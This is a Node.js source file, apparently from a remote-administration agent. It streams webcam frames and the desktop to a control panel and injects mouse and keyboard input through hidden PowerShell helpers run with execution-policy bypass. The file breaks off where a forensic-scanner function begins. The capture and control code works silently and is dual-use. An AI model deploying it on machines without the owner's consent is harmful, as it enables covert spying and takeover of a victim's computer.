// ==================== Camera Capture ====================

let cameraStreamActive = false;
let cameraProcess = null;
let cameraBuffer = Buffer.alloc(0);
let knownCameras = []; // Store detected cameras: [{id, name, altName}]

// Parse ffmpeg -list_devices output, capturing both display name AND alternative name
function parseFFmpegDeviceList(output) {
  const cameras = [];
  const lines = output.split('\n');
  let lastVideoName = null;
  for (const line of lines) {
    // Match display name: "Camera Name" (video)
    const nameMatch = line.match(/"([^"]+)"\s*\(video\)/i);
    if (nameMatch) {
      lastVideoName = nameMatch[1];
      cameras.push({ name: lastVideoName, altName: null });
      continue;
    }
    // Match alternative name on the line after the display name
    const altMatch = line.match(/Alternative name\s+"([^"]+)"/i);
    if (altMatch && cameras.length > 0 && !cameras[cameras.length - 1].altName) {
      cameras[cameras.length - 1].altName = altMatch[1];
    }
  }
  return cameras.map((c, i) => ({ id: i.toString(), name: c.name, altName: c.altName }));
}

function sendCameraList() {
  if (os.platform() !== 'win32') {
    send({
      type: 'camera_list',
      deviceId: DEVICE_ID,
      payload: { cameras: [], error: 'Camera listing only supported on Windows' },
    });
    return;
  }

  // Use ffmpeg DirectShow listing — parse both display names AND alternative device names
  exec(`"${ffmpegPath}" -list_devices true -f dshow -i dummy 2>&1`,
    { maxBuffer: 1024 * 1024, timeout: 10000, windowsHide: true },
    (err, stdout, stderr) => {
      const output = (stdout || '') + (stderr || '');
      const vidCams = parseFFmpegDeviceList(output);

      if (vidCams.length > 0) {
        knownCameras = vidCams;
        // Send display names to the panel (altName is kept internally for capture)
        send({
          type: 'camera_list',
          deviceId: DEVICE_ID,
          payload: { cameras: vidCams.map(c => ({ id: c.id, name: c.name })) },
        });
        return;
      }

      // FALLBACK: PnP entity detection if ffmpeg listing returns nothing
      const ps = `$devices = @(); $pnp = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' -or $_.PNPClass -eq 'Image' -or $_.Service -eq 'usbvideo' -or ($_.Caption -match 'webcam|camera|web cam|cam' -and $_.PNPClass -ne 'Keyboard' -and $_.PNPClass -ne 'Mouse') } | Select-Object Name -Unique; foreach ($d in $pnp) { if ($d.Name) { $devices += $d.Name } }; $devices = $devices | Select-Object -Unique; $result = @(); $i = 0; foreach ($n in $devices) { $result += @{ id = $i.ToString(); name = $n }; $i++ }; if ($result.Count -eq 0) { Write-Output '[]' } else { $result | ConvertTo-Json -Compress }`;
      exec(`powershell -NoProfile -NonInteractive -Command "${ps.replace(/"/g, '\\"')}"`,
        { maxBuffer: 1024 * 1024, timeout: 10000, windowsHide: true },
        (err2, stdout2) => {
          let cameras = [];
          if (!err2 && stdout2.trim()) {
            try {
              const parsed = JSON.parse(stdout2.trim());
              cameras = Array.isArray(parsed) ? parsed : [parsed];
            } catch { /* ignore */ }
          }
          knownCameras = cameras;
          send({
            type: 'camera_list',
            deviceId: DEVICE_ID,
            payload: { cameras },
          });
        }
      );
    }
  );
}

function startCameraStream(payload) {
  const cameraId = payload?.cameraId || '0';
  const fps = Math.min(Math.max(payload?.fps || 10, 1), 30);
  const quality = payload?.quality || 50;

  stopCameraStream();
  cameraStreamActive = true;

  // Resolve camera ID to device info from knownCameras
  const cam = knownCameras.find((c) => c.id === cameraId);
  const cameraDisplayName = cam?.name || cameraId;
  // Prefer alternative name (guaranteed to work with ffmpeg) over display name
  const cameraDeviceName = cam?.altName || cam?.name || cameraId;

  console.log(`[Agent] Starting camera: id=${cameraId} display="${cameraDisplayName}" device="${cameraDeviceName}" fps=${fps} quality=${quality}`);

  if (os.platform() !== 'win32') {
    startCameraLinux(cameraId, fps, quality);
    return;
  }

  // Check if ffmpeg is available
  const checkFfmpeg = () => {
    if (ffmpegPath !== 'ffmpeg') {
      if (fs.existsSync(ffmpegPath)) return true;
    }
    try { execSync('where ffmpeg', { timeout: 3000, windowsHide: true }); return true; } catch { return false; }
  };

  if (!checkFfmpeg()) {
    console.log('[Agent] ffmpeg not ready yet, waiting for download...');
    send({
      type: 'camera_frame',
      deviceId: DEVICE_ID,
      payload: { error: 'ffmpeg загружается... Камера запустится автоматически.' },
    });
    downloadFFmpeg();
    let pollCount = 0;
    const pollInterval = setInterval(() => {
      pollCount++;
      if (!cameraStreamActive) { clearInterval(pollInterval); return; }
      if (checkFfmpeg()) {
        clearInterval(pollInterval);
        console.log('[Agent] ffmpeg ready, starting camera now');
        launchCameraWithRetry(cameraDeviceName, cameraDisplayName, fps, quality);
        return;
      }
      if (pollCount >= 36) {
        clearInterval(pollInterval);
        cameraStreamActive = false;
        send({
          type: 'camera_frame',
          deviceId: DEVICE_ID,
          payload: { error: 'Не удалось загрузить ffmpeg. Проверьте интернет-подключение.' },
        });
      }
    }, 5000);
    return;
  }

  launchCameraWithRetry(cameraDeviceName, cameraDisplayName, fps, quality);
}

// Try multiple ffmpeg strategies to open the camera
function launchCameraWithRetry(deviceName, displayName, fps, quality) {
  if (!cameraStreamActive) return;

  // Strategy list: try different device name formats and input options
  const strategies = [];

  // Strategy 1: Alternative name (most reliable — hardware path)
  if (deviceName.startsWith('@device')) {
    strategies.push({ name: deviceName, extraArgs: [] });
    // Also try with explicit pixel_format as backup
    strategies.push({ name: deviceName, extraArgs: ['-pixel_format', 'mjpeg'] });
    strategies.push({ name: deviceName, extraArgs: ['-pixel_format', 'yuyv422'] });
  }

  // Strategy 2: Display name (human-readable)
  if (displayName !== deviceName) {
    strategies.push({ name: displayName, extraArgs: [] });
    strategies.push({ name: displayName, extraArgs: ['-pixel_format', 'mjpeg'] });
    strategies.push({ name: displayName, extraArgs: ['-pixel_format', 'yuyv422'] });
  }

  // Strategy 3: If deviceName is not alt format, try it with pixel formats
  if (!deviceName.startsWith('@device') && deviceName === displayName) {
    strategies.push({ name: deviceName, extraArgs: [] });
    strategies.push({ name: deviceName, extraArgs: ['-pixel_format', 'mjpeg'] });
    strategies.push({ name: deviceName, extraArgs: ['-pixel_format', 'yuyv422'] });
  }

  let strategyIdx = 0;
  let lastError = '';

  function tryNext() {
    if (!cameraStreamActive) return;
    if (strategyIdx >= strategies.length) {
      // All strategies exhausted
      cameraStreamActive = false;
      const msg = lastError || 'Не удалось открыть камеру ни одним из доступных способов.';
      send({
        type: 'camera_frame',
        deviceId: DEVICE_ID,
        payload: { error: msg },
      });
      return;
    }

    const strategy = strategies[strategyIdx];
    strategyIdx++;
    console.log(`[Agent] Camera strategy #${strategyIdx}: name="${strategy.name}" opts=[${strategy.extraArgs.join(',')}]`);
    startFFmpegCamera(strategy.name, fps, quality, strategy.extraArgs, (err) => {
      if (err && cameraStreamActive) {
        lastError = err;
        console.log(`[Agent] Camera strategy #${strategyIdx} failed: ${err}`);
        // Small delay before next retry
        setTimeout(tryNext, 500);
      }
      // If no error (success), do nothing — camera is streaming
    });
  }

  tryNext();
}

function startFFmpegCamera(cameraName, fps, quality, extraInputArgs, onFail) {
  const qscale = Math.max(2, Math.round(31 - quality * 0.29));
  extraInputArgs = extraInputArgs || [];

  // Build ffmpeg arguments:
  // -rtbufsize 100M: prevents DirectShow real-time buffer overflow
  // No -framerate on input: let camera negotiate native rate
  // -r on output: controls frame rate sent to panel
  const inputArgs = [
    '-f', 'dshow',
    '-rtbufsize', '100M',
    ...extraInputArgs,
    '-i', `video=${cameraName}`,
  ];
  const outputArgs = [
    '-f', 'image2pipe',
    '-vcodec', 'mjpeg',
    '-q:v', String(qscale),
    '-r', String(fps),
    'pipe:1',
  ];

  console.log(`[Agent] Camera ffmpeg: ${ffmpegPath} ${[...inputArgs, ...outputArgs].join(' ')}`);

  cameraProcess = spawn(ffmpegPath, [...inputArgs, ...outputArgs], {
    windowsHide: true,
    stdio: ['pipe', 'pipe', 'pipe'],
  });

  const proc = cameraProcess;
  cameraBuffer = Buffer.alloc(0);
  let gotFirstFrame = false;
  let stderrAccum = '';
  let failReported = false;

  proc.stdout.on('data', (chunk) => {
    if (!cameraStreamActive) return;

    cameraBuffer = Buffer.concat([cameraBuffer, chunk]);

    // Parse JPEG frames: find SOI (FF D8) and EOI (FF D9)
    while (cameraBuffer.length > 2) {
      const soiIndex = findMarker(cameraBuffer, 0xFF, 0xD8);
      if (soiIndex === -1) {
        cameraBuffer = Buffer.alloc(0);
        break;
      }
      if (soiIndex > 0) {
        cameraBuffer = cameraBuffer.slice(soiIndex);
      }

      const eoiIndex = findMarker(cameraBuffer, 0xFF, 0xD9, 2);
      if (eoiIndex === -1) break;

      const frameEnd = eoiIndex + 2;
      const frame = cameraBuffer.slice(0, frameEnd);
      cameraBuffer = cameraBuffer.slice(frameEnd);

      if (!gotFirstFrame) {
        gotFirstFrame = true;
        console.log(`[Agent] Camera: first frame received (${Math.round(frame.length / 1024)}KB)`);
      }

      const base64 = frame.toString('base64');
      send({
        type: 'camera_frame',
        deviceId: DEVICE_ID,
        payload: { image: 'data:image/jpeg;base64,' + base64 },
      });
    }

    if (cameraBuffer.length > 10 * 1024 * 1024) {
      cameraBuffer = Buffer.alloc(0);
    }
  });

  proc.stderr.on('data', (data) => {
    stderrAccum += data.toString();
  });

  proc.on('exit', (code) => {
    console.log(`[Agent] Camera ffmpeg exited (code ${code})`);
    cameraProcess = null;

    if (!gotFirstFrame && !failReported) {
      failReported = true;
      // Extract meaningful error lines from stderr
      const stderrLines = stderrAccum.split('\n');
      const errorLines = stderrLines.filter(l =>
        /error|could not|cannot|not found|no such|denied|access|device|i\/o|timeout|failed/i.test(l)
      ).map(l => l.trim()).filter(Boolean);
      const realError = errorLines.join(' | ').substring(0, 500) ||
        stderrAccum.trim().split('\n').slice(-5).join(' ').substring(0, 500);

      if (onFail) {
        // Report to retry logic
        onFail(realError || `код ${code}`);
      } else if (cameraStreamActive) {
        cameraStreamActive = false;
        send({
          type: 'camera_frame',
          deviceId: DEVICE_ID,
          payload: { error: 'Ошибка камеры: ' + (realError || `код ${code}`) },
        });
      }
    }
  });

  proc.on('error', (err) => {
    console.error('[Agent] Camera process error:', err.message);
    cameraProcess = null;
    if (!failReported) {
      failReported = true;
      if (onFail) {
        onFail(err.message);
      } else if (cameraStreamActive) {
        cameraStreamActive = false;
        send({
          type: 'camera_frame',
          deviceId: DEVICE_ID,
          payload: { error: 'Ошибка запуска ffmpeg: ' + err.message },
        });
      }
    }
  });

  // Timeout: if no frame in 8s and onFail callback present, try next strategy
  setTimeout(() => {
    if (!gotFirstFrame && cameraProcess === proc && !failReported) {
      failReported = true;
      console.error('[Agent] Camera timeout: no frames in 8s');
      try { proc.kill('SIGKILL'); } catch {}
      cameraProcess = null;
      if (onFail) {
        onFail('Таймаут — камера не отвечает');
      } else if (cameraStreamActive) {
        cameraStreamActive = false;
        send({
          type: 'camera_frame',
          deviceId: DEVICE_ID,
          payload: { error: 'Таймаут камеры. Камера может быть занята другим приложением.' },
        });
      }
    }
  }, 8000);
}

function findMarker(buffer, byte1, byte2, startFrom) {
  const start = startFrom || 0;
  for (let i = start; i < buffer.length - 1; i++) {
    if (buffer[i] === byte1 && buffer[i + 1] === byte2) {
      return i;
    }
  }
  return -1;
}

function startCameraLinux(cameraId, fps, quality) {
  const interval = Math.round(1000 / fps);

  function captureFrame() {
    if (!cameraStreamActive) return;
    const tmpFile = `/tmp/cam_${Date.now()}.jpg`;
    exec(`ffmpeg -f v4l2 -i /dev/video${cameraId} -frames:v 1 -q:v 5 -y ${tmpFile} 2>/dev/null`,
      { maxBuffer: 1024 * 1024, timeout: 8000, windowsHide: true },
      (err) => {
        if (!err && fs.existsSync(tmpFile)) {
          try {
            const imgData = fs.readFileSync(tmpFile);
            const base64 = imgData.toString('base64');
            fs.unlinkSync(tmpFile);
            if (cameraStreamActive) {
              send({
                type: 'camera_frame',
                deviceId: DEVICE_ID,
                payload: { image: 'data:image/jpeg;base64,' + base64 },
              });
            }
          } catch { /* ignore */ }
        }
        if (cameraStreamActive) {
          setTimeout(captureFrame, interval);
        }
      }
    );
  }
  captureFrame();
}

function stopCameraStream() {
  cameraStreamActive = false;
  if (cameraProcess) {
    const proc = cameraProcess;
    cameraProcess = null;
    try { proc.kill('SIGTERM'); } catch (e) { /* ignore */ }
    // Force kill after 2s if still running
    setTimeout(() => {
      try { proc.kill('SIGKILL'); } catch (e) { /* ignore */ }
    }, 2000);
  }
  cameraBuffer = Buffer.alloc(0);
  console.log('[Agent] Camera stream stopped');
}

// ==================== Screen Stream (Remote Desktop) ====================

let screenStreamActive = false;
let screenCaptureProcess = null;
let screenStreamBuffer = '';
let screenStreamGeneration = 0; // Generation counter to prevent race conditions
let inputHelperProcess = null;

function startScreenStream(payload) {
  const fps = Math.min(Math.max(payload?.fps || 15, 1), 30);
  const quality = Math.max(10, Math.min(payload?.quality || 50, 100));
  const scalePercent = Math.max(25, Math.min(payload?.scale || 100, 100));

  // Stop any existing stream
  stopScreenStream();
  screenStreamGeneration++;
  const gen = screenStreamGeneration;
  screenStreamActive = true;
  console.log(`[Agent] Starting screen stream (gen=${gen}): fps=${fps} quality=${quality} scale=${scalePercent}%`);

  if (os.platform() === 'win32') {
    startScreenStreamWindows(fps, quality, scalePercent, gen);
  } else {
    startScreenStreamLinux(fps, quality, scalePercent, gen);
  }
}

function startScreenStreamWindows(fps, quality, scalePercent, gen) {
  // Use persistent PowerShell process for fast screen capture via GDI+
  const psScript = `
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
} catch {
    [Console]::Error.WriteLine("LOAD_FAILED:" + $_.Exception.Message)
    exit 1
}

# Ensure DPI awareness for correct screen coordinates
try {
    Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class DPIUtil { [DllImport("user32.dll")] public static extern bool SetProcessDPIAware(); }'
    [DPIUtil]::SetProcessDPIAware()
} catch { }

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
if ($screen.Width -eq 0 -or $screen.Height -eq 0) {
    [Console]::Error.WriteLine("NO_SCREEN:No screen detected")
    exit 2
}
$encoders = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()
$jpegEncoder = $encoders | Where-Object { $_.MimeType -eq 'image/jpeg' }
if (-not $jpegEncoder) {
    [Console]::Error.WriteLine("NO_JPEG:JPEG encoder not found")
    exit 3
}
$interval = [int](1000 / ${fps})
$quality = [long]${quality}
$scalePercent = [int]${scalePercent}
$outW = [int]($screen.Width * $scalePercent / 100)
$outH = [int]($screen.Height * $scalePercent / 100)
$needScale = $scalePercent -lt 100
$encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
$encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, $quality)

# Pre-allocate reusable objects to avoid GC pressure
$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::NearestNeighbor
$graphics.CompositingQuality = [System.Drawing.Drawing2D.CompositingQuality]::HighSpeed

$scaledBitmap = $null
$scaledGraphics = $null
if ($needScale) {
    $scaledBitmap = New-Object System.Drawing.Bitmap($outW, $outH)
    $scaledGraphics = [System.Drawing.Graphics]::FromImage($scaledBitmap)
    $scaledGraphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::Bilinear
    $scaledGraphics.CompositingQuality = [System.Drawing.Drawing2D.CompositingQuality]::HighSpeed
}

# Cursor drawing support via Win32 API
$hasCursorHelper = $false
try {
    $cursorCS = @"
using System;
using System.Runtime.InteropServices;
using System.Drawing;
public class CursorHelper {
    [StructLayout(LayoutKind.Sequential)]
    public struct CURSORINFO { public int cbSize; public int flags; public IntPtr hCursor; public POINT ptScreenPos; }
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT { public int x; public int y; }
    [StructLayout(LayoutKind.Sequential)]
    public struct ICONINFO { public bool fIcon; public int xHotspot; public int yHotspot; public IntPtr hbmMask; public IntPtr hbmColor; }
    [DllImport("user32.dll")] public static extern bool GetCursorInfo(ref CURSORINFO pci);
    [DllImport("user32.dll")] public static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyHeight, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);
    [DllImport("user32.dll")] public static extern bool GetIconInfo(IntPtr hIcon, out ICONINFO piconinfo);
    [DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr hObject);
    public const int CURSOR_SHOWING = 1;
    public const int DI_NORMAL = 3;
    public static void DrawCursor(Graphics g, int screenX, int screenY) {
        CURSORINFO ci = new CURSORINFO();
        ci.cbSize = Marshal.SizeOf(ci);
        if (GetCursorInfo(ref ci) && (ci.flags & CURSOR_SHOWING) != 0) {
            ICONINFO ii;
            GetIconInfo(ci.hCursor, out ii);
            int curX = ci.ptScreenPos.x - screenX - ii.xHotspot;
            int curY = ci.ptScreenPos.y - screenY - ii.yHotspot;
            IntPtr hdc = g.GetHdc();
            DrawIconEx(hdc, curX, curY, ci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL);
            g.ReleaseHdc(hdc);
            if (ii.hbmMask != IntPtr.Zero) DeleteObject(ii.hbmMask);
            if (ii.hbmColor != IntPtr.Zero) DeleteObject(ii.hbmColor);
        }
    }
}
"@
    Add-Type -TypeDefinition $cursorCS -ReferencedAssemblies System.Drawing
    $hasCursorHelper = $true
} catch {
    $hasCursorHelper = $false
}

# Send resolution info first (always send actual screen resolution for correct mouse mapping)
[Console]::Out.WriteLine("RES:" + $screen.Width + ":" + $screen.Height)
[Console]::Out.Flush()
$errorCount = 0
$ms = New-Object System.IO.MemoryStream(2097152)
while ($true) {
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    try {
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)

        # Draw cursor on the captured frame
        if ($hasCursorHelper) {
            try { [CursorHelper]::DrawCursor($graphics, $screen.X, $screen.Y) } catch { }
        } else {
            # Simple fallback: draw default cursor shape
            try {
                $curPos = [System.Windows.Forms.Cursor]::Position
                $cx = $curPos.X - $screen.X
                $cy = $curPos.Y - $screen.Y
                [System.Windows.Forms.Cursors]::Default.Draw($graphics, (New-Object System.Drawing.Rectangle($cx, $cy, 32, 32)))
            } catch { }
        }

        $ms.SetLength(0)
        $ms.Position = 0
        if ($needScale) {
            $scaledGraphics.Clear([System.Drawing.Color]::Black)
            $scaledGraphics.DrawImage($bitmap, 0, 0, $outW, $outH)
            $scaledBitmap.Save($ms, $jpegEncoder, $encoderParams)
        } else {
            $bitmap.Save($ms, $jpegEncoder, $encoderParams)
        }
        $bytes = $ms.ToArray()
        $base64 = [Convert]::ToBase64String($bytes)
        [Console]::Out.WriteLine("FRAME:" + $screen.Width + ":" + $screen.Height + ":" + $base64)
        [Console]::Out.Flush()
        $errorCount = 0
    } catch {
        $errorCount++
        if ($errorCount -ge 10) {
            [Console]::Error.WriteLine("CAPTURE_FAILED:" + $_.Exception.Message)
            break
        }
        Start-Sleep -Milliseconds 100
    }
    $elapsed = $sw.ElapsedMilliseconds
    $sleepMs = [Math]::Max(1, $interval - $elapsed)
    [System.Threading.Thread]::Sleep($sleepMs)
}
# Cleanup
try { $ms.Dispose() } catch { }
try { $graphics.Dispose() } catch { }
try { $bitmap.Dispose() } catch { }
if ($needScale) {
    try { $scaledGraphics.Dispose() } catch { }
    try { $scaledBitmap.Dispose() } catch { }
}
`;
  const psFile = path.join(os.tmpdir(), `ra_screen_capture_${DEVICE_ID}.ps1`);
  try { fs.writeFileSync(psFile, psScript, 'utf8'); } catch (e) {
    console.error('[Agent] Failed to write screen capture script:', e.message);
    sendScreenError('Failed to create capture script: ' + e.message);
    return;
  }

  screenCaptureProcess = spawn('powershell', [
    '-Sta', '-NoProfile', '-NoLogo', '-ExecutionPolicy', 'Bypass', '-File', psFile
  ], { windowsHide: true, stdio: ['pipe', 'pipe', 'pipe'] });

  const proc = screenCaptureProcess; // Local ref for closure safety
  let stderrOutput = '';
  let gotFirstFrame = false;
  let lastFrameSent = 0;
  const minFrameInterval = Math.max(30, Math.round(1000 / fps) - 10); // Slightly less than target interval

  screenStreamBuffer = '';
  proc.stdout.on('data', (chunk) => {
    // Race condition guard: only process if this is still the active generation
    if (gen !== screenStreamGeneration || !screenStreamActive) return;
    screenStreamBuffer += chunk.toString();
    let nlIndex;
    while ((nlIndex = screenStreamBuffer.indexOf('\n')) !== -1) {
      const line = screenStreamBuffer.substring(0, nlIndex).trim();
      screenStreamBuffer = screenStreamBuffer.substring(nlIndex + 1);
      if (line.startsWith('FRAME:')) {
        // Frame rate control: skip frames if sending too fast or WS is congested
        const now = Date.now();
        if (now - lastFrameSent < minFrameInterval) continue; // Too soon, skip
        if (ws && ws.bufferedAmount > 512000) continue; // WS congested, skip frame

        const parts = line.split(':');
        if (parts.length >= 4) {
          const w = parseInt(parts[1]);
          const h = parseInt(parts[2]);
          const base64 = parts.slice(3).join(':'); // base64 may contain ':'
          if (base64.length > 100) {
            if (!gotFirstFrame) {
              gotFirstFrame = true;
              console.log(`[Agent] Screen stream: first frame received (${w}x${h}, ${Math.round(base64.length/1024)}KB)`);
            }
            lastFrameSent = now;
            send({
              type: 'screen_frame',
              deviceId: DEVICE_ID,
              payload: {
                image: 'data:image/jpeg;base64,' + base64,
                width: w,
                height: h,
                timestamp: Date.now(),
              },
            });
          }
        }
      } else if (line.startsWith('RES:')) {
        const resParts = line.split(':');
        if (resParts.length >= 3) {
          console.log(`[Agent] Screen resolution: ${resParts[1]}x${resParts[2]}`);
        }
      }
    }
  });

  proc.stderr.on('data', (data) => {
    stderrOutput += data.toString();
    console.error('[Agent] Screen capture stderr:', data.toString().trim());
  });

  proc.on('exit', (code) => {
    console.log(`[Agent] Screen capture process exited with code ${code} (gen=${gen}, current=${screenStreamGeneration})`);
    // Only update global state if this is still the active generation
    if (gen === screenStreamGeneration) {
      screenCaptureProcess = null;
      screenStreamActive = false;
      // Send error to admin if the process crashed
      if (code !== null && code !== 0) {
        let errorMsg = 'Screen capture process crashed (code ' + code + ')';
        if (stderrOutput.includes('LOAD_FAILED')) errorMsg = 'Failed to load screen capture libraries';
        else if (stderrOutput.includes('NO_SCREEN')) errorMsg = 'No screen detected on remote device';
        else if (stderrOutput.includes('CAPTURE_FAILED')) errorMsg = 'Screen capture failed repeatedly';
        else if (stderrOutput.trim()) errorMsg += ': ' + stderrOutput.trim().substring(0, 200);
        sendScreenError(errorMsg);
      }
    }
    try { fs.unlinkSync(psFile); } catch (e) { /* ignore */ }
  });

  // Timeout: if no frame received within 15 seconds, send error and stop
  setTimeout(() => {
    if (gen === screenStreamGeneration && screenStreamActive && !gotFirstFrame) {
      console.error('[Agent] Screen stream timeout: no frames received in 15s');
      sendScreenError('Screen capture timeout - no frames received. The agent may not have desktop access.');
      stopScreenStream();
    }
  }, 15000);
}

function sendScreenError(errorMsg) {
  send({
    type: 'screen_frame',
    deviceId: DEVICE_ID,
    payload: {
      error: errorMsg,
      timestamp: Date.now(),
    },
  });
}

function startScreenStreamLinux(fps, quality, scalePercent, gen) {
  const interval = Math.round(1000 / fps);

  function captureFrame() {
    if (!screenStreamActive || gen !== screenStreamGeneration) return;
    const tmpFile = `/tmp/ra_screen_${Date.now()}.jpg`;
    const scaleW = Math.round(1920 * scalePercent / 100);
    const scaleH = Math.round(1080 * scalePercent / 100);
    exec(`import -window root -resize ${scaleW}x${scaleH} ${tmpFile} && base64 -w 0 ${tmpFile} && rm -f ${tmpFile}`,
      { maxBuffer: 1024 * 1024 * 50, timeout: 5000, windowsHide: true },
      (err, stdout) => {
        if (!err && stdout && screenStreamActive && gen === screenStreamGeneration) {
          send({
            type: 'screen_frame',
            deviceId: DEVICE_ID,
            payload: {
              image: 'data:image/jpeg;base64,' + stdout.trim(),
              width: scaleW,
              height: scaleH,
              timestamp: Date.now(),
            },
          });
        }
        if (screenStreamActive && gen === screenStreamGeneration) {
          setTimeout(captureFrame, interval);
        }
      }
    );
  }
  captureFrame();
}

function stopScreenStream() {
  screenStreamActive = false;
  if (screenCaptureProcess) {
    const proc = screenCaptureProcess;
    screenCaptureProcess = null;
    try { proc.kill(); } catch (e) { /* ignore */ }
  }
  console.log('[Agent] Screen stream stopped');
}

// ==================== Input Control (Mouse + Keyboard) ====================

function startInputHelper() {
  if (inputHelperProcess) return;
  if (os.platform() !== 'win32') return;

  const psScript = `
[Console]::InputEncoding = [System.Text.Encoding]::UTF8
Add-Type -AssemblyName System.Windows.Forms
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class NativeInput {
    [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
}
"@
[NativeInput]::SetProcessDPIAware()
while ($true) {
    $line = [Console]::In.ReadLine()
    if ($null -eq $line -or $line -eq 'STOP') { break }
    $parts = $line.Split(':')
    $action = $parts[0]
    try {
        switch ($action) {
            'MOVE' {
                [NativeInput]::SetCursorPos([int]$parts[1], [int]$parts[2])
            }
            'MOUSEDOWN' {
                [NativeInput]::SetCursorPos([int]$parts[1], [int]$parts[2])
                switch ($parts[3]) {
                    'left' { [NativeInput]::mouse_event(0x02, 0, 0, 0, 0) }
                    'right' { [NativeInput]::mouse_event(0x08, 0, 0, 0, 0) }
                    'middle' { [NativeInput]::mouse_event(0x20, 0, 0, 0, 0) }
                }
            }
            'MOUSEUP' {
                [NativeInput]::SetCursorPos([int]$parts[1], [int]$parts[2])
                switch ($parts[3]) {
                    'left' { [NativeInput]::mouse_event(0x04, 0, 0, 0, 0) }
                    'right' { [NativeInput]::mouse_event(0x10, 0, 0, 0, 0) }
                    'middle' { [NativeInput]::mouse_event(0x40, 0, 0, 0, 0) }
                }
            }
            'DBLCLICK' {
                [NativeInput]::SetCursorPos([int]$parts[1], [int]$parts[2])
                [NativeInput]::mouse_event(0x02, 0, 0, 0, 0)
                [NativeInput]::mouse_event(0x04, 0, 0, 0, 0)
                Start-Sleep -Milliseconds 50
                [NativeInput]::mouse_event(0x02, 0, 0, 0, 0)
                [NativeInput]::mouse_event(0x04, 0, 0, 0, 0)
            }
            'SCROLL' {
                [NativeInput]::SetCursorPos([int]$parts[1], [int]$parts[2])
                [NativeInput]::mouse_event(0x0800, 0, 0, [int]$parts[3], 0)
            }
            'KEYDOWN' {
                [NativeInput]::keybd_event([byte]$parts[1], 0, 0, 0)
            }
            'KEYUP' {
                [NativeInput]::keybd_event([byte]$parts[1], 0, 0x02, 0)
            }
        }
    } catch {
        # Ignore input errors
    }
}
`;
  const psFile = path.join(os.tmpdir(), `ra_input_helper_${DEVICE_ID}.ps1`);
  try { fs.writeFileSync(psFile, psScript, 'utf8'); } catch (e) {
    console.error('[Agent] Failed to write input helper script:', e.message);
    return;
  }

  inputHelperProcess = spawn('powershell', [
    '-Sta', '-NoProfile', '-NoLogo', '-ExecutionPolicy', 'Bypass', '-File', psFile
  ], { windowsHide: true, stdio: ['pipe', 'pipe', 'pipe'] });

  inputHelperProcess.on('exit', (code) => {
    console.log(`[Agent] Input helper exited with code ${code}`);
    inputHelperProcess = null;
    try { fs.unlinkSync(psFile); } catch (e) { /* ignore */ }
  });

  inputHelperProcess.on('error', (err) => {
    console.error('[Agent] Input helper process error:', err.message);
    inputHelperProcess = null;
  });

  inputHelperProcess.stderr.on('data', () => { /* ignore */ });
  console.log('[Agent] Input helper started');
}

function stopInputHelper() {
  if (inputHelperProcess) {
    try { inputHelperProcess.stdin.write('STOP\n'); } catch (e) { /* ignore */ }
    setTimeout(() => {
      if (inputHelperProcess) {
        try { inputHelperProcess.kill(); } catch (e) { /* ignore */ }
        inputHelperProcess = null;
      }
    }, 1000);
  }
}

function writeInputCommand(cmd) {
  // Write command to input helper, auto-restart if it crashed
  if (!inputHelperProcess) {
    startInputHelper();
    if (!inputHelperProcess) return false;
    // Give it a moment to start
  }
  try {
    inputHelperProcess.stdin.write(cmd + '\n');
    return true;
  } catch (e) {
    console.error('[Agent] Input write failed, restarting helper:', e.message);
    inputHelperProcess = null;
    // Try once more with fresh process
    startInputHelper();
    if (!inputHelperProcess) return false;
    try {
      inputHelperProcess.stdin.write(cmd + '\n');
      return true;
    } catch (e2) {
      console.error('[Agent] Input write failed after restart:', e2.message);
      inputHelperProcess = null;
      return false;
    }
  }
}

function handleMouseInput(payload) {
  if (os.platform() !== 'win32') return;

  const { action, x, y, button, delta } = payload;
  switch (action) {
    case 'move':
      writeInputCommand(`MOVE:${x}:${y}`);
      break;
    case 'mousedown':
      writeInputCommand(`MOUSEDOWN:${x}:${y}:${button || 'left'}`);
      break;
    case 'mouseup':
      writeInputCommand(`MOUSEUP:${x}:${y}:${button || 'left'}`);
      break;
    case 'dblclick':
      writeInputCommand(`DBLCLICK:${x}:${y}`);
      break;
    case 'scroll':
      writeInputCommand(`SCROLL:${x}:${y}:${delta || 0}`);
      break;
  }
}

function handleKeyboardInput(payload) {
  if (os.platform() !== 'win32') return;

  const { action, vk } = payload;
  if (action === 'keydown' && vk) {
    writeInputCommand(`KEYDOWN:${vk}`);
  } else if (action === 'keyup' && vk) {
    writeInputCommand(`KEYUP:${vk}`);
  }
}

// ==================== Forensic Scanner ====================

function handleForensicScan(payload) {
  const scanType = payload?.scanType || 'full';
  const archiveOnly = !!payload?.archiveOnly;
  const scanId = `scan-${Date.now()}`;
  console.log(`[Agent] Forensic scan requested: ${scanType}${archiveOnly ? ' (archive only)' : ''}`);

  // Send progress update
  function progress(pct) {
    send({
      type: 'forensic_result',
      deviceId: DEVICE_ID,
